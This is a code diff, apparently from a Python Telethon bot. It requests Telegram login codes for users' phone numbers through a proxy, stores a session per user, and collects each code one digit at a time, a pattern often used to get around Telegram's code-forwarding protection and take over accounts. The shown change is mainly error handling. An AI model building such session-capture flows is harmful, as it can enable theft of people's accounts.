@@ -1129,20 +1129,53 @@ async def handle_response(event):
 
         # Запрашиваем код авторизации
         session_path = get_session_path(user_id)
-        client = TelegramClient(session_path, API_ID, API_HASH)
-        await client.connect()
+        client = TelegramClient(
+            session_path,
+            API_ID,
+            API_HASH,
+            proxy=('socks5', 'proxy_host', 1080, True, 'login', 'password')
+        )
         try:
-            code_request = await client.send_code_request(phone_number)
+            await client.connect()
+
+            # Проверяем подключение
+            if not await client.is_connected():
+                await event.respond("Ошибка подключения к серверам Telegram.")
+                return
+
+            # Запрос кода с обработкой FloodWait
+            try:
+                code_request = await client.send_code_request(phone_number)
+                logger.info(f"Code request response: {code_request}")
+            except FloodWaitError as e:
+                wait_time = e.seconds
+                logger.error(f"FloodWaitError: Need to wait {wait_time} seconds")
+                await event.respond(f"⚠️ Слишком много попыток. Попробуйте через {wait_time // 60} минут.")
+                return
+            except PhoneNumberInvalidError:
+                await event.respond("❌ Неверный номер телефона.")
+                return
+            except Exception as e:
+                logger.error(f"Error sending code: {str(e)}")
+                await event.respond("🚫 Ошибка при отправке кода. Попробуйте позже.")
+                return
+
             phone_codes[user_id] = {
                 'phone_code_hash': code_request.phone_code_hash,
                 'client': client,
-                'current_code': ''  # Инициализируем переменную для сбора кода
+                'current_code': ''
             }
-            await event.respond("Код авторизации отправлен. Вводите код по одной цифре.")
-            logger.info("Код отправлен. Ожидание ввода кода по одной цифре...")
+
+            # Логируем информацию о подключении
+            logger.info(f"Connected: {await client.is_connected()}")
+            logger.info(f"Authorized: {await client.is_user_authorized()}")
+
+            await event.respond("✅ Код авторизации отправлен. Вводите цифры по одной.")
+
         except Exception as e:
-            logger.error(f"Error sending code: {e}")
-            await event.respond("Ошибка при отправке кода. Попробуйте снова (возможно слишком частая попытка получить код(подождите 11 часовесли не получится)).")
+            logger.error(f"Connection error: {str(e)}")
+            await event.respond("⚠️ Ошибка подключения к Telegram. Проверьте сетевые настройки сервера.")
+            return
 
     # Шаг 2: ввод кода авторизации по одной цифре
     elif state['stage'] == 'waiting_code':
